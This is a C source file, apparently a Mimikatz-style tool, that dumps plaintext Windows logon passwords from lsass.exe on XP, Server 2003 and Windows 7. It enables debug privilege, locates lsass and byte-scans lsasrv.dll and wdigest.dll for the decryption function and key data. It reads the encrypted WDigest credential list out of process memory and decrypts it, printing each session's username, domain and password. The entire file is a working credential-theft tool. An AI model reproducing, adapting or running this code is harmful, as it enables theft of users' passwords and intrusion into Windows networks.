#include <windows.h>
#include <stdio.h>

// 
//  Vsbat[0x710dddd] 
//  
//  Note: VC++ 6.0编译/Admin权限执行
//

#define MEM_SIZE 0x1000
#define WIN7     0x1
#define WINXP    0x2
#define WIN03    0x4

typedef struct _LSA_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} LSA_UNICODE_STRING , *PLSA_UNICODE_STRING ;

typedef struct _SECURITY_LOGON_SESSION_DATA {  
    ULONG Size;  
    LUID LogonId; 
    LSA_UNICODE_STRING UserName;  
    LSA_UNICODE_STRING LogonDomain;  
    LSA_UNICODE_STRING AuthenticationPackage;  
    ULONG LogonType;  ULONG Session;  
    PSID Sid;  
    LARGE_INTEGER LogonTime;  
    LSA_UNICODE_STRING LogonServer;  
    LSA_UNICODE_STRING DnsDomainName;  
    LSA_UNICODE_STRING Upn;
} SECURITY_LOGON_SESSION_DATA,  *PSECURITY_LOGON_SESSION_DATA ;


typedef int (__stdcall * pNTQUERYPROCESSINFORMATION)(HANDLE, DWORD, PVOID, ULONG, PULONG) ;
typedef int (__stdcall * pLSAENUMERATELOGONSESSIONS)(PULONG, PLUID *) ;
typedef int (__stdcall * pDECRIPTFUNC)(PBYTE, DWORD) ;
typedef int (__stdcall * pLSAFREERETURNBUFFER)(PVOID) ;
typedef int (__stdcall * pLSAGETLOGONSESSIONDATA)(PLUID, PSECURITY_LOGON_SESSION_DATA *) ;

int    EnableDebugPrivilege() ;
void   printHexBytes(PBYTE data, int nBytes) ;
PBYTE  search_bytes(PBYTE pBegin, PBYTE pEnd, PBYTE pBytes, DWORD nsize) ;
void   CopyKeyGlobalData(HANDLE hProcess, LPVOID hModlsasrv, int osKind) ;
HANDLE GetProcessHandleByName(const CHAR *szName) ;
LPVOID GetEncryptListHead() ;
void   printSessionInfo(pLSAGETLOGONSESSIONDATA, pLSAFREERETURNBUFFER, PLUID) ;


// 解密函数特征码(lsasrv.text)
BYTE DecryptfuncSign[] = { 0x8B, 0xFF, 0x55, 0x8B, 
                           0xEC, 0x6A, 0x00, 0xFF, 
                           0x75, 0x0C, 0xFF, 0x75,
                           0x08, 0xE8 } ; 
    
// 密钥KEY相关的关键地址特征码(lsasrv.text)
BYTE DecryptKeySign_WIN7[]  = { 0x33, 0xD2, 0xC7, 0x45, 0xE8, 0x08, 0x00, 0x00, 0x00, 0x89, 0x55, 0xE4 } ;
BYTE DecryptKeySign_XP[]    = { 0x8D, 0x85, 0xF0, 0xFE, 0xFF, 0xFF, 0x50, 0xFF, 0x75, 0x10, 0xFF, 0x35 } ;

// 密文关键指针特征码(wdigest.text)
BYTE KeyPointerSign[]  = { 0x8B, 0x45, 0x08, 0x89, 0x08, 0xC7, 0x40, 0x04 } ;

// 全局变量
BYTE MemBuf[MEM_SIZE], SecBuf[0x200], ThirdBuf[0x200] ;
BYTE Encryptdata[0x100] ;




HANDLE GetProcessHandleByName(const CHAR *szName)
{
    //
    // GetProcessHandle获得lsass.exe进程句柄
    //
    DWORD  dwProcessId , ReturnLength, nBytes ;
    WCHAR  Buffer[MAX_PATH + 0x20] ;
    HANDLE hProcess ;
    PWCHAR pRetStr ;
    pNTQUERYPROCESSINFORMATION NtQueryInformationProcess ;
    CHAR   szCurrentPath[MAX_PATH] ;

    NtQueryInformationProcess = (pNTQUERYPROCESSINFORMATION)GetProcAddress(GetModuleHandle("ntdll.dll") , \
                                    "NtQueryInformationProcess") ;

    // Process ID 一定是 4 的倍数
    for(dwProcessId = 4 ; dwProcessId < 10*1000 ; dwProcessId += 4)
    {
        hProcess = OpenProcess(PROCESS_ALL_ACCESS , FALSE, dwProcessId) ;
        if(hProcess != NULL)
        {
            if(!NtQueryInformationProcess(hProcess, 27, Buffer, sizeof(Buffer), &ReturnLength))
            {
                pRetStr = (PWCHAR)(*(DWORD *)((DWORD)Buffer + 4)) ;
                
                nBytes = WideCharToMultiByte(CP_ACP, 0, pRetStr, -1, \
                                    szCurrentPath, MAX_PATH, NULL, NULL) ;
                if(nBytes)
                {
                    PCHAR pCurName = &szCurrentPath[nBytes-1] ;
                    while(pCurName >= szCurrentPath)
                    {
                        if(*pCurName == '\\')  break ;
                        pCurName -- ;
                    }
                    pCurName ++ ;
                    if(lstrcmpi(szName, pCurName) == 0)
                    {
                        return hProcess ;
                    }
                }
            }
            // 关闭打开的句柄
            CloseHandle(hProcess) ;
        }
    }
    return NULL ;
}


LPVOID GetEncryptListHead()
{
    //
    // 根据KeyPointerSign[]获得密文存储的关键相关地址
    //
    HINSTANCE hMod ;
    LPVOID    pEndAddr, KeyPointer, pTemp ;

    hMod = LoadLibrary("wdigest.dll") ;
    pEndAddr = GetProcAddress(hMod, "SpInstanceInit") ;
    pTemp = hMod ;
    KeyPointer = NULL ;
    while(pTemp < pEndAddr && pTemp != NULL)
    {
        KeyPointer = pTemp ;
        pTemp = (LPVOID)search_bytes((PBYTE)pTemp + sizeof(KeyPointerSign), (PBYTE)pEndAddr, \
                KeyPointerSign, sizeof(KeyPointerSign)) ;
    }
    KeyPointer = (LPVOID)(*(DWORD *)((DWORD)KeyPointer - 4)) ;
    FreeLibrary(hMod) ;
    return KeyPointer ;
}


int main()
{
    HINSTANCE hModlsasrv ;
    DWORD     LogonSessionCount, i ,dwBytesRead ;
    PLUID     LogonSessionList, pCurLUID , pListLUID ;
    BYTE      EncryptBuf[0x200] ;
    HANDLE    hProcess ;


    if(EnableDebugPrivilege() != 1)
        puts("EnableDebugPrivilege fail !") ;

    hProcess = GetProcessHandleByName("lsass.exe") ;
    if(hProcess == NULL)
    {
        puts("GetProcessHandleByName fail !") ;
        puts("Try To Run As Administrator ...") ;
        system("echo Press any Key to Continue ... & pause > nul") ;
        return 0 ;
    }

    OSVERSIONINFO VersionInformation ;
    DWORD dwVerOff = 0 , osKind = -1 ;

    // 版本判断
    memset(&VersionInformation, 0, sizeof(VersionInformation));
    VersionInformation.dwOSVersionInfoSize = sizeof(VersionInformation) ;
    GetVersionEx(&VersionInformation) ;
    if (VersionInformation.dwMajorVersion == 5)
    {
      if ( VersionInformation.dwMinorVersion == 1 )
      {
            dwVerOff = 36 ;
            osKind = WINXP ;
      }
      else if (VersionInformation.dwMinorVersion == 2)
      {
            dwVerOff = 28 ;
            osKind = WIN03 ;
      }
    }
    else if (VersionInformation.dwMajorVersion == 6)
    {
        dwVerOff = 32 ;
        osKind = WIN7 ;
    } 

    if(osKind == -1)
    {
        printf("[Undefined OS version]  Major: %d Minor: %d\n", \
              VersionInformation.dwMajorVersion, VersionInformation.dwMinorVersion) ;
        system("echo Press any Key to Continue ... & pause > nul") ;
        CloseHandle(hProcess) ;
        return 0 ;
    }

    // 获得解密函数地址
    pDECRIPTFUNC  DecryptFunc ;
    hModlsasrv  = LoadLibrary("lsasrv.dll") ;
    DecryptFunc = (pDECRIPTFUNC)search_bytes((PBYTE)hModlsasrv, (PBYTE)0x7fffdddd, DecryptfuncSign, sizeof(DecryptfuncSign)) ;
          
    // 获得密文链表头地址
    LPVOID  ListHead ;
    ListHead = GetEncryptListHead() ;                 

    // 获得全局数据(lsasrv.data及解密KEY相关的数据)
    CopyKeyGlobalData(hProcess, hModlsasrv, osKind) ;  

    HINSTANCE                   hModSecur32 ;
    pLSAENUMERATELOGONSESSIONS  LsaEnumerateLogonSessions ;
    pLSAGETLOGONSESSIONDATA     LsaGetLogonSessionData ; 
    pLSAFREERETURNBUFFER        LsaFreeReturnBuffer ;

    hModSecur32               = LoadLibrary("Secur32.dll") ;
    LsaEnumerateLogonSessions = (pLSAENUMERATELOGONSESSIONS)GetProcAddress(hModSecur32, "LsaEnumerateLogonSessions") ;
    LsaGetLogonSessionData    = (pLSAGETLOGONSESSIONDATA)GetProcAddress(hModSecur32, "LsaGetLogonSessionData") ;
    LsaFreeReturnBuffer       = (pLSAFREERETURNBUFFER)GetProcAddress(hModSecur32, "LsaFreeReturnBuffer") ;

    LsaEnumerateLogonSessions(&LogonSessionCount, &LogonSessionList) ;
    for(i = 0 ; i < LogonSessionCount ; i++)
    {
        pCurLUID = (PLUID)((DWORD)LogonSessionList + sizeof(LUID) * i) ;
        // 打印相关信息
        printSessionInfo(LsaGetLogonSessionData, LsaFreeReturnBuffer, pCurLUID) ;
        // 遍历链式结构查找当前的LUID
        ReadProcessMemory(hProcess,  ListHead, EncryptBuf, 0x100, &dwBytesRead) ;
        while(*(DWORD *)EncryptBuf != (DWORD)ListHead)
        {
            ReadProcessMemory(hProcess, (LPVOID)(*(DWORD *)EncryptBuf), EncryptBuf, 0x100, &dwBytesRead) ;
            pListLUID = (LUID *)((DWORD)EncryptBuf + 0x10) ;
            if((pListLUID->LowPart  ==  pCurLUID->LowPart) && (pListLUID->HighPart == pCurLUID->HighPart)) 
            { 
                break ;
            }
        }
        if(*(DWORD *)EncryptBuf == (DWORD)ListHead)
        {
            puts("Specific LUID NOT found\n") ;
            continue ;
        }

        DWORD   pFinal = 0 ;
        DWORD   nBytes = 0 ;
        LPVOID  pEncrypt   ;
        pFinal   = (DWORD)(pListLUID) + dwVerOff  ;
        nBytes   = *(WORD *)((DWORD)pFinal + 2) ;            // 密文大小
        pEncrypt = (LPVOID)(*(DWORD *)((DWORD)pFinal + 4)) ; // 密文地址(Remote)

        memset(Encryptdata, 0, sizeof(Encryptdata)) ;
        ReadProcessMemory(hProcess, (LPVOID)pEncrypt, Encryptdata, nBytes, &dwBytesRead) ;
 
        // 调用解密函数解密
        DecryptFunc(Encryptdata, nBytes) ; 
        // 打印密码明文
        printf("password: %S\n\n", Encryptdata) ;
    }

    CloseHandle(hProcess) ;
    LsaFreeReturnBuffer(LogonSessionList) ;

    FreeLibrary(hModlsasrv) ;
    FreeLibrary(hModSecur32) ;
    if(osKind == WIN7)
    {
        FreeLibrary(GetModuleHandle("bcrypt.dll")) ;
        FreeLibrary(GetModuleHandle("bcryptprimitives.dll")) ;
    }
   
    system("echo Press any Key to EXIT ... & pause > nul") ;

    return 0 ;
}


void printSessionInfo(pLSAGETLOGONSESSIONDATA  LsaGetLogonSessionData, pLSAFREERETURNBUFFER LsaFreeReturnBuffer, PLUID pCurLUID)
{
    PSECURITY_LOGON_SESSION_DATA pLogonSessionData ;

    LsaGetLogonSessionData(pCurLUID, &pLogonSessionData) ;
    printf("UserName: %S\n", pLogonSessionData->UserName.Buffer) ;
    printf("LogonDomain: %S\n", pLogonSessionData->LogonDomain.Buffer) ;

    LsaFreeReturnBuffer(pLogonSessionData) ;
}


int EnableDebugPrivilege()
{
    HANDLE hToken ;
    LUID   sedebugnameValue ;
    TOKEN_PRIVILEGES tkp ;

    if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken) )
    {
        puts("OpenProcessToken fail") ;
        return 0 ;
    }
    if(!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue))
    {
        puts("LookupPrivilegeValue fail") ;
        return 0 ;
    }

    tkp.PrivilegeCount = 1 ;
    tkp.Privileges[0].Luid = sedebugnameValue ;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED ;
    if(!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL) )
    {
        puts("AdjustTokenPrivileges fail") ;
        return 0 ;
    }
    return 1 ;
}


PBYTE search_bytes(PBYTE pBegin, PBYTE pEnd, PBYTE pBytes, DWORD nsize)
{
    //
    // 在pBegin与pEnd之间搜索pBytes地址处的指定字节序列，字节个数为nsize
    //
    DWORD count ;
    PBYTE pDst ;

    while((DWORD)pBegin + (DWORD)nsize <= (DWORD)pEnd)
    {
        pDst  = pBytes ;
        count = 0 ;
        while(count < nsize && *pBegin == *pDst)
        {
            pBegin ++ ;
            pDst   ++ ;
            count  ++ ;
        }
        if(count == nsize)  break ;
        pBegin = pBegin - count + 1 ;
    }
    if(count == nsize)
    {
        return (PBYTE)((DWORD)pBegin - (DWORD)count) ;
    }
    else
    {
        return NULL ;
    }
}


void CopyKeyGlobalData(HANDLE hProcess, LPVOID hModlsasrv, int osKind)
{
    PIMAGE_SECTION_HEADER pSectionHead ;
    PIMAGE_DOS_HEADER     pDosHead ;
    PIMAGE_NT_HEADERS     pPEHead  ;
    DWORD                 dwBytes, dwBytesRead ;
    LPVOID                pdataAddr, pDecryptKey , DecryptKey, pEndAddr ;
    
    pDosHead     = (PIMAGE_DOS_HEADER)hModlsasrv ;
    pSectionHead = (PIMAGE_SECTION_HEADER)(pDosHead->e_lfanew + (DWORD)hModlsasrv \
                   + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER)) ;

    pdataAddr = (LPVOID)((DWORD)pSectionHead->VirtualAddress  + (DWORD)hModlsasrv) ;
    dwBytes   = ((DWORD)(pSectionHead->Misc.VirtualSize) / 0x1000 + 1) * 0x1000 ;
    ReadProcessMemory(hProcess, pdataAddr, pdataAddr, dwBytes, &dwBytesRead) ;

    pPEHead   = (PIMAGE_NT_HEADERS)(pDosHead->e_lfanew + (DWORD)hModlsasrv) ;
    pEndAddr  = (LPVOID)(pPEHead->OptionalHeader.SizeOfImage + (DWORD)hModlsasrv) ;

    switch(osKind)
    {
    case WINXP :
    case WIN03 :
        {
            pDecryptKey = (LPVOID)search_bytes((PBYTE)(hModlsasrv), (PBYTE)pEndAddr , \
                            DecryptKeySign_XP, sizeof(DecryptKeySign_XP)) ;

            pDecryptKey = (LPVOID)*(DWORD *)((DWORD)pDecryptKey + sizeof(DecryptKeySign_XP)) ;
            ReadProcessMemory(hProcess, (LPVOID)pDecryptKey, &DecryptKey, 4, &dwBytesRead) ;
            // DecryptKey 是与解密相关的关键地址
            ReadProcessMemory(hProcess, (LPVOID)DecryptKey, MemBuf, 0x200, &dwBytesRead) ;
            pdataAddr  = (LPVOID)pDecryptKey ;
            *(DWORD *)pdataAddr = (DWORD)MemBuf ;

            break ;
        }
    case WIN7 :
        {
            // WIN7 需调用这两个DLL中的函数进行解密
            LoadLibrary("bcrypt.dll") ;
            LoadLibrary("bcryptprimitives.dll") ;

            pDecryptKey = (LPVOID)search_bytes((PBYTE)(hModlsasrv), (PBYTE)pEndAddr , \
                            DecryptKeySign_WIN7, sizeof(DecryptKeySign_WIN7)) ;
            pDecryptKey = (LPVOID)(*(DWORD *)((DWORD)pDecryptKey - 4)) ;
    
            // DecryptKey 是与解密相关的关键地址
            ReadProcessMemory(hProcess,  pDecryptKey, &DecryptKey, 0x4, &dwBytesRead) ;
            
            ReadProcessMemory(hProcess, (LPVOID)DecryptKey, MemBuf, 0x200, &dwBytesRead) ;
            pdataAddr  = (LPVOID)pDecryptKey ;
            *(DWORD *)pdataAddr = (DWORD)MemBuf ;
    
            ReadProcessMemory(hProcess, (LPVOID)(*(DWORD *)((DWORD)MemBuf + 8)), SecBuf, 0x200, &dwBytesRead) ;
            pdataAddr  = (LPVOID)((DWORD)MemBuf + 8) ;
            *(DWORD *)pdataAddr = (DWORD)SecBuf ;

            ReadProcessMemory(hProcess, (LPVOID)(*(DWORD *)((DWORD)MemBuf + 0xC)), ThirdBuf, 0x200, &dwBytesRead) ;
            pdataAddr  = (LPVOID)((DWORD)MemBuf + 0xC) ;
            *(DWORD *)pdataAddr = (DWORD)ThirdBuf ;        

            break ;
        }
    }
    return ;
}


// -- EOF -- //


